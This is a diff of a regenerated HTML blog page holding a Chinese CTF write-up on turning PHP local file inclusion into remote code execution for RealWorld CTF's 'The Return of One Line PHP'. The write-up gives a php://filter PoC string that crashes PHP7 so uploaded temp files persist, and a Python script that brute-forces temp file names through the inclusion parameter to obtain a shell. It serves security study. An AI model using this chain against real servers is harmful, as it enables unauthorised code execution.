@@ -1,7 +1,7 @@
 
  <!DOCTYPE HTML>
-<html >
-<head>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="UTF-8">
   
     <title>LFI 2 RCE | H o o k | 潜心习安全</title>
@@ -18,6 +18,7 @@
 <meta property="og:url" content="https://gloxec.github.com/2018/12/04/LFI 2 RCE/index.html">
 <meta property="og:site_name" content="H o o k | 潜心习安全">
 <meta property="og:description" content="从本地文件包含到远程代码执行RealWorld CTF比赛期间和队友熬夜成功一血打下TP-Link摄像头，撒花兴喜🎉，但因为0day未修复的原因就暂不记录，记录下挺有意思的一道web题。题目来源于RealWorld CTF中的The Return of One Line PHP，起初题目来源于🍊在HITCON2018出的One Line PHP Change，利用filter与session.">
+<meta property="og:locale" content="default">
 <meta property="og:image" content="https://gloxec.github.com/images/LFI%202%20RCE/1.png">
 <meta property="og:image" content="https://gloxec.github.com/images/LFI%202%20RCE/2.png">
 <meta property="og:image" content="https://gloxec.github.com/images/LFI%202%20RCE/3.png">
@@ -40,14 +41,14 @@
     
     <link rel="stylesheet" href="/css/style.css">
 </head>
-
+</html>
   <body>
     <header>
       
 <div>
 		
 			<div id="imglogo">
-				<a href="/"><img src="/img/logo.png" alt="H o o k | 潜心习安全" title="H o o k | 潜心习安全"/></a>
+				<a href="/"><img src="/img/logo.png" alt="H o o k | 潜心习安全" title="H o o k | 潜心习安全"></a>
 			</div>
 			
 			<div id="textlogo">
@@ -70,13 +71,13 @@
  					
 					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
 						<label>Search</label>
-						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search">
 						<input type="hidden" name="q" value="site:gloxec.github.com">
 					</form>
 					
 					</li>
 				</ul>
-			</nav>			
+			</ul></nav>			
 </div>
     </header>
     <div id="container">
@@ -92,7 +93,7 @@
        
 		<a href="/about" title="hook" target="_blank" itemprop="author">hook</a>
 		
-  <p class="article-time">
+  </p><p class="article-time">
     <time datetime="2018-12-04T03:15:37.000Z" itemprop="datePublished"> Published 2018-12-04</time>
     
   </p>
@@ -108,14 +109,14 @@
 		
 		<h1 id="从本地文件包含到远程代码执行"><a href="#从本地文件包含到远程代码执行" class="headerlink" title="从本地文件包含到远程代码执行"></a>从本地文件包含到远程代码执行</h1><p><strong>RealWorld CTF</strong>比赛期间和队友熬夜成功一血打下<strong>TP-Link摄像头</strong>，撒花兴喜🎉，但因为0day未修复的原因就暂不记录，记录下挺有意思的一道web题。<br>题目来源于<strong>RealWorld CTF</strong>中的<strong>The Return of One Line PHP</strong>，起初题目来源于🍊在<strong>HITCON2018</strong>出的<strong>One Line PHP Change</strong>，利用filter与session.upload构造开头@&lt;?php文件流来进行RCE。</p>
 <a id="more"></a>
-<h2 id="文件流保存"><a href="#文件流保存" class="headerlink" title="文件流保存"></a>文件流保存</h2><p>php在处理请求数据包时，若包含一个文件上传的流，那么会先将包中的文件流保存到临时目录下，并且以<code>php+6位随机数</code>名称保存，经过用户编写好的代码处理完毕后，再unlink掉临时保存的文件。<br><img src="/images/LFI 2 RCE/1.png" alt=""><br>详见:<br><a href="https://github.com/bl4de/security_whitepapers/blob/master/PHP_LFI_rfc1867_temporary_files.pdf" target="_blank" rel="noopener">PHP LFI rfc1867 temporary file</a></p>
-<h2 id="临时文件的保留"><a href="#临时文件的保留" class="headerlink" title="临时文件的保留"></a>临时文件的保留</h2><p>这些临时文件在被php删除前有一段空白时间<br><img src="/images/LFI 2 RCE/2.png" alt=""><br>比赛时刚开始队友想到用请求无法访问的地址如<code>https://www.google.com</code>来让处理超时一段时间，最终测试发现临时文件在服务器上最多能存留30s的时间，接着被php删除。<br>刚开始思路就是大量请求，尽可能让在30s的时间内生成大量临时文件，然后去碰撞到这些文件，但6位的随机数在30秒中碰撞实在是要太欧皇才可以。</p>
+<h2 id="文件流保存"><a href="#文件流保存" class="headerlink" title="文件流保存"></a>文件流保存</h2><p>php在处理请求数据包时，若包含一个文件上传的流，那么会先将包中的文件流保存到临时目录下，并且以<code>php+6位随机数</code>名称保存，经过用户编写好的代码处理完毕后，再unlink掉临时保存的文件。<br><img src="/images/LFI 2 RCE/1.png" alt><br>详见:<br><a href="https://github.com/bl4de/security_whitepapers/blob/master/PHP_LFI_rfc1867_temporary_files.pdf" target="_blank" rel="noopener">PHP LFI rfc1867 temporary file</a></p>
+<h2 id="临时文件的保留"><a href="#临时文件的保留" class="headerlink" title="临时文件的保留"></a>临时文件的保留</h2><p>这些临时文件在被php删除前有一段空白时间<br><img src="/images/LFI 2 RCE/2.png" alt><br>比赛时刚开始队友想到用请求无法访问的地址如<code>https://www.google.com</code>来让处理超时一段时间，最终测试发现临时文件在服务器上最多能存留30s的时间，接着被php删除。<br>刚开始思路就是大量请求，尽可能让在30s的时间内生成大量临时文件，然后去碰撞到这些文件，但6位的随机数在30秒中碰撞实在是要太欧皇才可以。</p>
 <h2 id="php7的异常退出"><a href="#php7的异常退出" class="headerlink" title="php7的异常退出"></a>php7的异常退出</h2><p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure></p>
 <p>详情链接:<br><a href="https://hackmd.io/s/Hk-2nUb3Q?from=singlemessage&amp;isappinstalled=0" target="_blank" rel="noopener">poc详细分析</a></p>
 <p>若是能将临时文件永久保留下来，生成大量临时文件再去碰撞那么机率将会高很多。<br>上面的poc就可以导致php7全版本在处理时异常退出，那么临时文件就不会因为执行后面的unlink操作而被删除。</p>
-<h2 id="碰撞"><a href="#碰撞" class="headerlink" title="碰撞"></a>碰撞</h2><p><img src="/images/LFI 2 RCE/3.png" alt=""><br>最终花了将近39分钟碰撞到了生成的临时文件，再去包含就可以正常拿到shell了</p>
+<h2 id="碰撞"><a href="#碰撞" class="headerlink" title="碰撞"></a>碰撞</h2><p><img src="/images/LFI 2 RCE/3.png" alt><br>最终花了将近39分钟碰撞到了生成的临时文件，再去包含就可以正常拿到shell了</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">临时文件数量</span><br><span class="line">$ ls ./php* | wc</span><br><span class="line">  23278   23278  279336</span><br></pre></td></tr></table></figure>
-<p><img src="/images/LFI 2 RCE/4.png" alt=""></p>
+<p><img src="/images/LFI 2 RCE/4.png" alt></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import requests, random</span><br><span class="line">import datetime</span><br><span class="line"></span><br><span class="line">charset = &quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890&quot;</span><br><span class="line"></span><br><span class="line">host = &quot;127.0.0.1&quot;</span><br><span class="line">port = 8001</span><br><span class="line">base_url = &quot;http://%s:%d&quot; % (host, port)</span><br><span class="line">starttime = datetime.datetime.now()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_filename():</span><br><span class="line">    ret = &quot;&quot;</span><br><span class="line">    for i in range(6):</span><br><span class="line">        ret += random.choice(charset)</span><br><span class="line">    return ret</span><br><span class="line"></span><br><span class="line">def brute_force_tmp_files():</span><br><span class="line">    filename = get_filename()</span><br><span class="line">    url = &quot;&#123;&#125;/index.php?orange=/tmp/php&#123;&#125;&quot;.format(base_url, filename)</span><br><span class="line">    print &quot;php&quot; + filename</span><br><span class="line">    try:</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        if b&apos;flag&apos; in r.text:</span><br><span class="line">            print(&quot;[+] Include success!&quot;)</span><br><span class="line">            print(url)</span><br><span class="line">            endtime = datetime.datetime.now()</span><br><span class="line">            print (endtime-starttime).seconds</span><br><span class="line">            exit()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    flag = False</span><br><span class="line">    while 1:</span><br><span class="line">        brute_force_tmp_files()</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
   
 	</div>
@@ -139,7 +140,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="https://gloxec.github.com/2018/12/04/LFI 2 RCE/" data-title="LFI 2 RCE | H o o k | 潜心习安全" data-tsina="" class="share clearfix">
+	  <div data-url="https://gloxec.github.com/2018/12/04/LFI 2 RCE/" data-title="LFI 2 RCE | H o o k | 潜心习安全" data-tsina class="share clearfix">
 	  </div>
 	
 	</div>
@@ -154,8 +155,8 @@
  
 
 <div class="next">
-<a href="/2018/08/09/Use Frida to decrypt communication packets and interact with Burpsuite/"  title="Use Frida to decrypt communication packets and interact with Burpsuite">
- <strong>下一篇：</strong><br/> 
+<a href="/2018/08/09/Use Frida to decrypt communication packets and interact with Burpsuite/" title="Use Frida to decrypt communication packets and interact with Burpsuite">
+ <strong>下一篇：</strong><br> 
  <span>Use Frida to decrypt communication packets and interact with Burpsuite
 </span>
 </a>
@@ -166,10 +167,10 @@
 	<section id="comments" class="comment">
   <div id="blog_comment"></div>
   <script src="https://cdn.jsdelivr.net/gh/theme-next/theme-next-gitment@1/gitment.browser.js"></script>
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/theme-next/theme-next-gitment@1/default.css"/>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/theme-next/theme-next-gitment@1/default.css">
   <script>
   var gitment = new Gitment({
-    id: window.location.pathname,
+    id: (window.location.pathname.length < 50) ? window.location.pathname : "{{ page.date }}",
     owner: 'gloxec',
     repo: 'blog.comment.repo',
     oauth: {
@@ -198,7 +199,7 @@
 <div class="github-card">
 <p class="asidetitle">Github Card</p>
 <div class="github-card" data-github="gloxec" data-theme="medium"></div>
-<script type="text/javascript" src="//cdn.jsdelivr.net/github-cards/latest/widget.js" ></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/github-cards/latest/widget.js"></script>
 </div>
 
 
@@ -365,7 +366,7 @@
 </aside>
 </div>
     </div>
-    <footer><div id="footer" >
+    <footer><div id="footer">
 	
 	<div class="line">
 		<span></span>
@@ -374,11 +375,11 @@
 	
 	
 	<section class="info">
-		<p> 如果想 <br/>
+		<p> 如果想 <br>
 			一切都还来的及</p>
 	</section>
 	 
-	<div class="social-font" class="clearfix">
+	<div class="social-font">
 		
 		
 		<a href="https://github.com/gloxec" target="_blank" class="icon-github" title="github"></a>
@@ -588,7 +589,7 @@ var _hmt = _hmt || [];
 <!-- Totop Begin -->
 
 	<div id="totop">
-	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	<a title="Back to Top"><img src="/img/scrollup.png"></a>
 	</div>
 	<script src="/js/totop.js"></script>
 
